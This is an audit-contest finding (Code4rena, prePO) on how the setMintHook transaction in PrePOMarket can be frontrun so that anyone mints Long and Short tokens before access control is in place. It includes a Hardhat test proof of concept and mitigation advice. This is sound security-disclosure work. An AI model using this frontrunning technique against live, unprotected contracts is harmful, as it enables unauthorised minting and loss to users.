## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- M-03

# [Frontrunning for unallowed minting of Short and Long tokens](https://github.com/code-423n4/2022-12-prepo-findings/issues/93) 

# Lines of code

https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L68
https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L109


# Vulnerability details

## Unallowed minting of Short and Long tokens
The documentation states that minting of the Short and Long tokens should only be done by the governance.

```solidity
File: apps/smart-contracts/core/contracts/interfaces/IPrePOMarket.sol
73:    * Minting will only be done by the team, and thus relies on the `_mintHook`
74:    * to enforce access controls. This is also why there is no fee for `mint()`
75:    * as opposed to `redeem()`.
```

The problem is, that as long as the **_mintHook** is not set via **setMintHook**, everyone can use the mint function and mint short and long tokens.
At the moment the **_mintHook** is not set in the contructor of PrePOMarket and so the transaction that will set the **_mintHook** can be front run to mint short and long tokens for the attacker.

## Proof of Concept
https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L68
https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L109

This test shows how a attacker could frontrun the **setMintHook** function

```node
  describe('# mint front run attack', () => {
    let mintHook: FakeContract<Contract>
    beforeEach(async () => {
      prePOMarket = await prePOMarketAttachFixture(await createMarket(defaultParams))
    })
    it('user can frontrun the set setMintHook to mint long and short tokens', async () => {
      
      mintHook = await fakeMintHookFixture()
      await collateralToken.connect(deployer).transfer(user.address, TEST_MINT_AMOUNT.mul(2))
      await collateralToken.connect(user).approve(prePOMarket.address, TEST_MINT_AMOUNT.mul(2))

      // we expect the mintHook to always revert
      mintHook.hook.reverts()

      // attacker frontruns the setMintHook, even we expect the mintHook to revert, we will mint
      await prePOMarket.connect(user).mint(TEST_MINT_AMOUNT)

      // governance sets the mintHook
      await prePOMarket.connect(treasury).setMintHook(mintHook.address)

      // as we expect minthook to revert if not called from treasury, it will revert now
      mintHook.hook.reverts()
      await expect(prePOMarket.connect(user).mint(TEST_MINT_AMOUNT)).to.be.reverted

      // we should now have long and short tokens in the attacker account
      const longToken = await LongShortTokenAttachFixture(await prePOMarket.getLongToken())
      const shortToken = await LongShortTokenAttachFixture(await prePOMarket.getShortToken())
      expect(await longToken.balanceOf(user.address)).to.eq(TEST_MINT_AMOUNT)
      expect(await shortToken.balanceOf(user.address)).to.eq(TEST_MINT_AMOUNT)
    })
  })
```

## Recommended Mitigation Steps
To prevent the front-running, the **_mintHook** should be set in the deployment in the PrePOMarketFactory.

You could add one more address to the createMarket that accepts the mintHook address for that deployment and just add the address after
```solidity
File: apps/smart-contracts/core/contracts/PrePOMarketFactory.sol
46:     PrePOMarket _newMarket = new PrePOMarket{salt: _salt}(_governance, _collateral, ILongShortToken(address(_longToken)), ILongShortToken(address(_shortToken)), _floorLongPrice, _ceilingLongPrice, _floorValuation, _ceilingValuation, _expiryTime);
47:     deployedMarkets[_salt] = address(_newMarket);
```
the PrePOMarket ist deployed in the Factory.

Alternative you could add a default MintHook-Contract address that will always revert until it's changed to a valid one,